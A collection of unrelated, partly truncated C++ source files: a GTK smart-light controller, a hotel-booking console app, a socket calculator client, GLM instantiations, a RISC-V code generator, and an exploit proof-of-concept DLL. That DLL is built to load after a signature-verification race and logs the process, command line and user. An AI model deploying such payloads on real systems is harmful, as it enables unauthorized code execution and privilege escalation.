{\n\t\tm_btnsColors[i].signal_clicked().connect([this, colors, i] { this->color_clicked(colors[i]); });\n\t\tm_grid.attach(m_btnsColors[i], (i % 4) + 1, (i / 4) + 1, 1, 1);\n\t}\n\n\tm_grid1.set_row_spacing(5); \n\tm_grid1.set_column_spacing(5); \n\tm_grid1.set_row_homogeneous(true); \n\tm_grid1.set_column_homogeneous(true); \n\n\tstd::string briLevels[] = {\"20\", \"40\", \"120\", \"254\"};\n\tfor (size_t i = 0; i < m_btnsBri.size(); ++i) {\n\t\tm_btnsBri[i].signal_clicked().connect([this, briLevels, i] { this->bri_clicked(briLevels[i]); });\n\t\tm_grid1.attach(m_btnsBri[i], (i % 4) + 1, (i / 4) + 1, 1, 1);\n\t}\n\n\tm_btnOn.signal_clicked().connect([this] { this->on_clicked(); });\n\tm_box1.append(m_btnOn);\n\tm_btnOff.signal_clicked().connect([this] { this->off_clicked(); });\n\tm_box1.append(m_btnOff);\n\n\tm_box.append(m_labelBri);\n\tm_box.append(m_slidBri);\n\tm_box.append(m_labelHue);\n\tm_box.append(m_slidHue);\n\tm_box.append(m_labelSat);\n\tm_box.append(m_slidSat);\n\tm_box.append(m_grid);\n\tm_box.append(m_grid1);\n\tm_box.append(m_box1);\n}\n\nUI::~UI() \n{\n}\n\nvoid UI::slider_clicked(Gtk::Scale& slider, const std::string& option)\n{\n\tstd::string data;\n  if (option == \"bri\") {\n      data = \"{\\\"bri\\\":\" + std::to_string(static_cast<int>(slider.get_value())) + \"}\";\n  } else if (option == \"hue\") {\n      data = \"{\\\"hue\\\":\" + std::to_string(static_cast<int>(slider.get_value())) + \"}\";\n  } else if (option == \"sat\") {\n      data = \"{\\\"sat\\\":\" + std::to_string(static_cast<int>(slider.get_value())) + \"}\";\n  }\n\n\tCURL *curl = curl_easy_init();\n\tif (curl) {\n\t\tCURLcode res;\n\t\tstruct curl_slist *headers = nullptr;\n\t\theaders = curl_slist_append(headers, \"Content-Type: application/json\");\n\t\tcurl_easy_setopt(curl, CURLOPT_URL, \"http://192.168.2.10:42000/api/connor-bedroom-light/set-state\");\n\t\tcurl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());\n\t\tcurl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n\t\tres = curl_easy_perform(curl);\n\t\tif (res != CURLE_OK) {\n\t\t\tstd::cerr << \"curl_easy_perform() failed: \" << curl_easy_strerror(res) << std::endl;\n\t\t}\n        \n\t\tcurl_easy_cleanup(curl);\n\t}\n}\n\nvoid UI::color_clicked(int color)\n{\n\tstd::string data = \"{\\\"hue\\\":\" + std::to_string(static_cast<int>(color)) + \",\\\"sat\\\":\" + std::string(\"203\") + \"}\";\n\n\tCURL *curl = curl_easy_init();\n\tif (curl) {\n\t\tCURLcode res;\n\t\tstruct curl_slist *headers = nullptr;\n\t\theaders = curl_slist_append(headers, \"Content-Type: application/json\");\n\t\tcurl_easy_setopt(curl, CURLOPT_URL, \"http://192.168.2.10:42000/api/connor-bedroom-light/set-state\");\n\t\tcurl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());\n\t\tcurl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n\t\tres = curl_easy_perform(curl);\n\t\tif (res != CURLE_OK) {\n\t\t\tstd::cerr << \"curl_easy_perform() failed: \" << curl_easy_strerror(res) << std::endl;\n\t\t}\n        \n\t\tcurl_easy_cleanup(curl);\n\t}\n}\n\nvoid UI::bri_clicked(const std::string& bri)\n{\n\tstd::string data = \"{\\\"bri\\\":\" + bri + \"}\";\n\n\tCURL *curl = curl_easy_init();\n\tif (curl) {\n\t\tCURLcode res;\n\t\tstruct curl_slist *headers = nullptr;\n\t\theaders = curl_slist_append(headers, \"Content-Type: application/json\");\n\t\tcurl_easy_setopt(curl, CURLOPT_URL, \"http://192.168.2.10:42000/api/connor-bedroom-light/set-state\");\n\t\tcurl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());\n\t\tcurl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n\t\tres = curl_easy_perform(curl);\n\t\tif (res != CURLE_OK) {\n\t\t\tstd::cerr << \"curl_easy_perform() failed: \" <",
    "#include<iostream>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<iomanip>\r\n#include<fstream>\r\nusing namespace std;\r\nclass hotel\r\n{\r\nprivate:\r\n    int roomno;\r\n    char name[20];\r\n    char phno[10];\r\n    public:\r\n    void mainmenu();\r\n    void roomlist();\r\n    void addroom();\r\n    void removeroom();\r\n    void modify();\r\n    void edit();\r\n    void searchcustomer();\r\n\r\n     void addcustomer();\r\n     void showdetails();\r\n     int getroom()\r\n     {\r\n         return roomno;\r\n     }\r\n     char* getname()\r\n     {\r\n         return name;\r\n     }\r\n     char* getphone()\r\n     {\r\n         return phno;\r\n     }\r\n};\r\nvoid hotel:: mainmenu()\r\n{\r\n    int choice;\r\n    system(\"CLS\");\r\n    cout<<\"\\n\\n\\t\\t\\t\\xB1\\xB1\\xB1 MENU \\xB1\\xB1\\xB1\\n\\n1. List of Rooms\\n2. Add Room\\n3. Remove room\\n4. Edit customer record\\n5. Search Customer\\n6. Exit\\n\\n\\t\\t\\t\\tEnter Option:\";\r\n   cin>>choice;\r\n   switch (choice)\r\n   {\r\n   case 1:\r\n       roomlist();\r\n       break;\r\n\r\n   case 2:\r\n       addroom();\r\n       break;\r\n\r\n   case 3:\r\n       removeroom();\r\n       break;\r\n\r\n   case 4:\r\n       modify();\r\n       break;\r\n\r\n   case 5:\r\n       searchcustomer();\r\n        break;\r\n\r\n   case 6:\r\n       exit(0);\r\n\r\n   default:\r\n       system(\"cls\");\r\n       cout<<\"\\n\\n\\n\\n\\t\\t\\tWRONG CHOICE!!!!\\n\\n\\n\\t\\t\\t\\tPress any key to continue...\";\r\n       getch();\r\n   }\r\n}\r\nfstream fp;\r\nhotel h;\r\n\r\nvoid hotel::addcustomer()\r\n{\r\n    cout<<\"\\n\\n  Enter room number: \";\r\n    cin>>roomno;\r\n    if(roomno>0 && roomno<=10)\r\n    {\r\n      cout<<\"\\n  Enter name: \";\r\n     cin>>name;\r\n      cout<<\"\\n  Enter phone number: \";\r\n     // cin.ignore();\r\n      //cin.getline(phno,10);\r\n      cin>>phno;\r\n    }\r\n    else\r\n    {\r\n        system(\"cls\");\r\n        cout<<\"\\n\\n\\n\\n\\n\\t\\t\\t ROOM NOT AVAILABLE!!\";\r\n    }\r\n\r\n}\r\n\r\nvoid hotel:: roomlist()\r\n{\r\n    system(\"CLS\");\r\n    cout<<\"\\n\\n\\t\\t\\t\\xB1\\xB1\\xB1 Room LIst \\xB1\\xB1\\xB1\\n\";\r\n    fp.open(\"hotel.dat\",ios::in);\r\n    cout<<\"\\n\\n-------------------------------------------------------------------\\n\";\r\n    cout<<\"\\nRoom no\\t\\t\"<<setw(3)<<\"Name\\t\\t\"<<setw(20)<<\" Phone no \"<<endl;\r\n    cout<<\"\\n-------------------------------------------------------------------\\n\";\r\n    while(fp.read((char*)&h,sizeof(hotel)))\r\n    {\r\n      cout<<roomno<<setw(3)<<\"\\t\\t\"<<name<<setw(20)<<\"\\t\\t\"<< phno<<endl;\r\n    }\r\n    fp.close();\r\n    cout<<\"\\n\\n\\t\\tPress any key to go back..\";\r\n    getch();\r\n    mainmenu();\r\n}\r\n\r\nvoid hotel::addroom()\r\n{\r\n    system(\"CLS\");\r\n    cout<<\"\\n\\n\\t\\t\\t\\xB1\\xB1\\xB1 ADD ROOM \\xB1\\xB1\\xB1\\n\";\r\n    fp.open(\"hotel.dat\",ios::out|ios::app);\r\n    h.addcustomer();\r\n    fp.write((char*)&h,sizeof(hotel));\r\n    fp.close();\r\n    cout<<\"\\n\\n\\t\\tPress any key to go back..\";\r\n    getch();\r\n    mainmenu();\r\n\r\n}\r\n\r\nvoid hotel:: removeroom()\r\n{\r\n    system(\"CLS\");\r\n    cout<<\"\\n\\n\\t\\t\\t\\xB1\\xB1\\xB1 REMOVE ROOM \\xB1\\xB1\\xB1\\n\";\r\n    int n,f=0;\r\n    cout<<\"\\n\\nEnter the room no of the customer you want to remove: \";\r\n    cin>>n;\r\n    fp.open(\"hotel.dat\",ios::in|ios::binary);\r\n    fstream demo;\r\n    fstream extra;\r\n    demo.open(\"temp.dat\",ios::out|ios::app|ios::binary);\r\n    fp.seekg(0,ios::beg);\r\n    while(fp.read((char*)&h,sizeof(hotel)))\r\n    {\r\n        if(h.getroom()== n)\r\n        {\r\n            extra.write((char*)&h,sizeof(hotel));\r\n             f=1;\r\n        }\r\n        else\r\n        {\r\n            demo.write((char*)&h,sizeof(hotel));\r\n\r\n        }\r\n    }\r\n    demo.close();\r\n    extra.close();\r\n    fp.close();\r\n    remove(\"hotel.dat\");\r\n    rename(\"temp.dat\",\"hotel.dat\");\r\n    if(f==1)\r\n    {\r\n        system(\"cls\");\r\n        cout<<\"\\n\\n\\n\\n\\n\\t\\t\\tRecord deleted!\";\r\n    }\r\n    else\r\n    {\r\n       system(\"cls\");\r\n       cout<<\"\\n\\n\\n\\n\\n\\t\\t\\tRecord not found!!\";\r\n    }\r\n\r\n    cout<<\"\\n\\n\\t\\tPress any key to go back..\";\r\n    getch();\r\n    mainmenu();\r\n\r\n}\r\n\r\nvoid hotel::modify()\r\n{\r\n    system(\"CLS\");\r\n    cout<<\"\\n\\n\\t\\t\\t\\xB1\\xB1\\xB1 EDIT CUSTOMER RECORD \\xB1\\xB1\\xB1\\n\";\r\n    int n;\r\n    int f=0;\r\n    int pos;\r\n    cout<<\"\\nEnter room no: \";\r\n    cin>>n;\r\n    fp.open(\"hotel.dat\",ios::in|ios::out);\r\n    while(fp.read((char*)&h,sizeof(hotel)) && f==0)\r\n    {\r\n        if(h.getroom()==n)\r\n        {\r\n            h.showdetails();\r\n            cout<<\"\\n\\n\\t\\tEnter new info: \"<<endl;\r\n            h.edit();\r\n            pos= -1*sizeof(h);\r\n            fp.seekp(pos,ios::cur);\r\n            fp.write((char*)&h,sizeof(hotel));\r\n            cout<<\"\\n\\nReccord updated successfully\";\r\n            f=1;\r\n        }\r\n    }\r\n    fp.close();\r\n    if(f==0)\r\n    {\r\n        system(\"cls\");\r\n        cout<<\"\\n\\n\\t\\tRecord not found!!\";\r\n    }\r\n    cout<<\"\\n\\n\\t\\tPress any key to go back..\";\r\n    getch();\r\n    mainmenu();\r\n}\r\n\r\nvoid hotel:: edit()\r\n{\r\n\r\n    cout<<\"\\n\\nRoom number: \"<<roomno;\r\n    cout<<\"\\n\\nModify name: \";\r\n    cin>>name;\r\n    cout<<\"\\nModify phone number: \";\r\n    cin>>phno;\r\n\r\n}\r\nvoid hotel::searchcustomer()\r\n{\r\n    system(\"CLS\");\r\n    int f=0;\r\n    int n;\r\n    cout<<\"\\n\\n\\t\\t\\t\\xB1\\xB1\\xB1 SEARCH CUSTOMER\\xB1\\xB1\\xB1\\n\";\r\n    cout<<\"\\nEnter Room number: \";\r\n",
    "// c:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars32.bat\r\n// cl.exe /D_USRDLL /D_WINDLL /MT /Tc raw.cpp /link /DLL /out:raw.dll /SUBSYSTEM:WINDOWS /MACHINE:x86\r\n\r\n// We don't do a proper proxy DLL, as we don't care about breaking the original functionality or even about the mere presence of \r\n// relevant export table entries and we are not faking the digital signature. The reason is - this DLL will be loaded after winning\r\n// the race condition in the signature verification process, and we don't care about this DLL working and thee potential risk of the process crashing some time after DllMain() is loaded.\r\n#include <windows.h>\r\n#pragma comment(lib,\"user32.lib\")\r\n#pragma comment(lib,\"kernel32.lib\")\r\n#pragma comment(lib,\"advapi32.lib\")\r\n\r\nBOOL APIENTRY DllMain( HMODULE hModule,\r\n                       DWORD  ul_reason_for_call,\r\n                       LPVOID lpReserved\r\n                     )\r\n{\r\n\tif (ul_reason_for_call == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tRevertToSelf(); // if possible, revert the impersonation of the current thread\r\n\t\tchar user_name[104];\r\n\t\tmemcpy(user_name, \"\", 104);\r\n\t\tchar module_fname[MAX_PATH];\r\n\t\tmemcpy(module_fname, \"\", MAX_PATH);\r\n\t\tLPSTR command_line = GetCommandLineA();\r\n\t\tGetModuleFileNameA(NULL, module_fname, MAX_PATH);\r\n\t\tHANDLE hFile = CreateFileA(\"C:\\\\users\\\\Public\\\\poc.txt\", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\r\n\r\n\t\tDWORD max_user_name = 104;\r\n\t\tGetUserNameA(user_name, &max_user_name);\r\n\r\n\t\tDWORD bytesWritten; char lf[] = \"\\n\"; char left_bracket[] = \" [ \"; char right_bracket[] = \" ] \";\r\n\t\tif (hFile != INVALID_HANDLE_VALUE)\r\n\t\t{\r\n\t\t\tSetFilePointer(hFile, 0, NULL, FILE_END);\r\n\t\t\tWriteFile(hFile, module_fname, strlen(module_fname), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, left_bracket, strlen(left_bracket), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, command_line, strlen(command_line), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, right_bracket, strlen(left_bracket), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, left_bracket, strlen(left_bracket), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, user_name, strlen(user_name), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, right_bracket, strlen(left_bracket), &bytesWritten, NULL);\r\n\t\t\tWriteFile(hFile, lf, 1, &bytesWritten, NULL);\r\n\t\t\tCloseHandle(hFile);\r\n\t\t}\r\n\t}\r\n\treturn TRUE;\r\n}\r\n\r\n",
    "\ufeff\r\n#include <arpa/inet.h>\r\n#include <netinet/in.h>\r\n#include <sys/socket.h>\r\n#include <unistd.h>\r\n#include <cstring>\r\n#include <iostream>\r\n#include <sstream>\r\n#include \"parser.h\"\r\n\r\n// \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u0434\u043b\u044f \u0440\u0430\u0431\u043e\u0442\u044b \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\nvoid send_request(int client_socket, const std::string& request);\r\nvoid register_user(int client_socket, const std::string& username,\r\n    const std::string& password);\r\nvoid login_user(int client_socket, const std::string& username,\r\n    const std::string& password);\r\nvoid get_history(int client_socket, const std::string& username);\r\n\r\nint main() {\r\n    int client_socket;\r\n    struct sockaddr_in serv_addr;\r\n\r\n    // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n    if ((client_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\r\n        std::cerr << \"Socket creation error\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    serv_addr.sin_family = AF_INET;\r\n    serv_addr.sin_port = htons(8080);\r\n\r\n    // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 IP \u0430\u0434\u0440\u0435\u0441\u0430 \u0432 \u0444\u043e\u0440\u043c\u0430\u0442 \u0441\u0435\u0442\u0438\r\n    if (inet_pton(AF_INET, \"127.0.0.1\", &serv_addr.sin_addr) <= 0) {\r\n        std::cerr << \"Invalid address/ Address not supported\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043a \u0441\u0435\u0440\u0432\u0435\u0440\u0443\r\n    if (connect(client_socket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) <\r\n        0) {\r\n        std::cerr << \"Connection Failed\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    std::string command;\r\n    std::string username, password;\r\n\r\n    while (true) {\r\n        std::cout << \"\u25b6 Enter 'register' to create a new account, 'login' to login, \"\r\n            \"'history' to view your history, 'calculate' to be able to \"\r\n            \"calculate an algebraic expression or 'exit' to quit: \";\r\n        std::cin >>\r\n            command;  //\u041d\u0430 \u0441\u0430\u043c\u043e\u043c \u0434\u0435\u043b\u0435 \u043d\u0435\u0442 \u043a\u043e\u043c\u0430\u043d\u0434\u044b calculate, \u043f\u0440\u043e\u0441\u0442\u043e \u0447\u0442\u043e-\u043b\u0438\u0431\u043e \u043e\u0442\u043b\u0438\u0447\u043d\u043e\u0435 \u043e\u0442 \u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0435\u043d\u043d\u044b\u0445\r\n\r\n        if (command == \"exit\") {\r\n            // \u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u043a\u043e\u043c\u0430\u043d\u0434\u0443 \u043d\u0430 \u043e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u0438 \u0432\u044b\u0445\u043e\u0434\u0438\u043c \u0438\u0437 \u0446\u0438\u043a\u043b\u0430\r\n            send_request(client_socket, \"EXIT\");\r\n            break;\r\n        }\r\n        else if (command == \"register\") {\r\n            // \u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043d\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n            std::cout << \" Enter username: \";\r\n            std::cin >> username;\r\n            std::cout << \" Enter password: \";\r\n            std::cin >> password;\r\n            register_user(client_socket, username, password);\r\n        }\r\n        else if (command == \"login\") {\r\n            // \u0412\u0445\u043e\u0434 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n            std::cout << \" Enter username: \";\r\n            std::cin >> username;\r\n            std::cout << \" Enter password: \";\r\n            std::cin >> password;\r\n            login_user(client_socket, username, password);\r\n        }\r\n        else if (command == \"history\") {\r\n            // \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0438\u0441\u0442\u043e\u0440\u0438\u0438 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n            get_history(client_socket, username);\r\n        }\r\n        else {\r\n            // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0430\u043b\u0433\u0435\u0431\u0440\u0430\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u0432\u044b\u0440\u0430\u0436\u0435\u043d\u0438\u044f\r\n            std::string expression;\r\n            std::cin.ignore();  // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0431\u0443\u0444\u0435\u0440 \u0432\u0432\u043e\u0434\u0430\r\n            std::cout << \" Enter an expression to calculate (e.g., '2+2*2', etc.), or 'exit' to quit: \";\r\n            std::getline(std::cin, expression);\r\n            send_request(client_socket, expression);\r\n        }\r\n    }\r\n\r\n    close(client_socket);\r\n    // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0438 \u043e\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430\r\n    std::cout << \"\u25b6 Disconnected from server\" << std::endl;\r\n    return 0;\r\n}\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0437\u0430\u043f\u0440\u043e\u0441\u0430 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440 \u0438 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u043e\u0442\u0432\u0435\u0442\u0430\r\nvoid send_request(int client_socket, const std::string& request) {\r\n    char buffer[1024] = { 0 };\r\n    send(client_socket, request.c_str(), request.length(), 0);\r\n    recv(client_socket, buffer, 1024, 0);\r\n    if (request != \"EXIT\") {\r\n        std::cout << \"\u25b6 Result: \" << buffer << std::endl;\r\n    }\r\n}\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u0438 \u043d\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\nvoid register_user(int client_socket, const std::string& username,\r\n    const std::string& password) {\r\n    std::string request = \"REGISTER \" + username + \" \" + password;\r\n    send_request(client_socket, request);\r\n}\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u0445\u043e\u0434\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\nvoid login_user(int client_socket, const std::string& username,\r\n    const std::string& password) {\r\n    std::string request = \"LOGIN \" + username + \" \" + password;\r\n    send_request(client_socket, request);\r\n}\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u0438\u0441\u0442\u043e\u0440\u0438\u0438 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\nvoid get_history(int client_socket, const std::string& username) {\r\n    std::string request = \"GET_HISTORY \" + username;\r\n    send_request(client_socket, request);\r\n}\r\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include \"builder/riscv_builder.hpp\"\n\nvoid RISCVBuilder::load_to_reg(koopa_raw_value_t kval, const char *reg)\n{\n    if (kval->kind.tag == KOOPA_RVT_INTEGER)\n        output << \"\\tli \" << reg << \", \" << kval->kind.data.integer.value << endl;\n    else if(kval->kind.tag == KOOPA_RVT_GLOBAL_ALLOC)\n    {\n        output << \"\\tla t0, \" << kval->name + 1 << endl;\n        output << \"\\tlw \" << reg << \", 0(t0)\" << endl;\n    }\n    else\n    {\n        int addr = env.GetAddr(kval);\n        if(addr < -2048 || addr > 2047)\n        {\n            output << \"\\tli t6, \" << addr << endl;\n            output << \"\\tadd t6, t6, sp\" << endl;\n            output << \"\\tlw \" << reg << \", \" << \"0(t6)\" << endl;\n        }\n        else\n            output << \"\\tlw \" << reg << \", \" << addr << \"(sp)\" << endl;\n    }\n}\n\nvoid RISCVBuilder::store_to_stack(int addr, const char *reg)\n{\n    if(addr < -2048 || addr > 2047)\n    {\n        output << \"\\tli t6, \" << addr << endl;\n        output << \"\\tadd t6, t6, sp\" << endl;\n        output << \"\\tsw \" << reg << \", \" << \"0(t6)\" << endl;\n    }\n    else\n        output << \"\\tsw \" << reg << \", \" << addr << \"(sp)\" << endl;\n}\n\nvoid RISCVBuilder::gen_riscv_value_aggregate(koopa_raw_value_t kval)\n{\n    if(kval->ty->tag == KOOPA_RTT_ARRAY)\n    {\n        for(int i = 0; i < kval->kind.data.aggregate.elems.len; i++)\n            gen_riscv_value_aggregate((koopa_raw_value_t)kval->kind.data.aggregate.elems.buffer[i]);\n    }\n    else\n        output << \"\\t.word \" << kval->kind.data.integer.value << endl;\n}\n\nvoid RISCVBuilder::gen_riscv_value_global_alloc(koopa_raw_value_t kalloc)\n{\n    output << \".globl \" << kalloc->name + 1 << endl;\n    output << kalloc->name + 1 << \":\" << endl;\n    if (kalloc->kind.data.global_alloc.init->kind.tag == KOOPA_RVT_ZERO_INIT)\n    {\n        output << \"\\t.zero \" << calc_type_size(kalloc->ty->data.pointer.base) << endl;\n    }\n    else if(kalloc->kind.data.global_alloc.init->kind.tag == KOOPA_RVT_AGGREGATE)\n        gen_riscv_value_aggregate(kalloc->kind.data.global_alloc.init);\n    else\n        output << \"\\t.word \" << kalloc->kind.data.global_alloc.init->kind.data.integer.value << endl;\n}\n\nvoid RISCVBuilder::gen_riscv_value_load(const koopa_raw_load_t *kload, int addr)\n{\n    output << endl;\n\n    if(kload->src->kind.tag == KOOPA_RVT_GET_ELEM_PTR || kload->src->kind.tag == KOOPA_RVT_GET_PTR)\n    {\n        load_to_reg(kload->src, \"t0\");\n        output << \"\\tlw t0, 0(t0)\" << endl;\n        store_to_stack(addr, 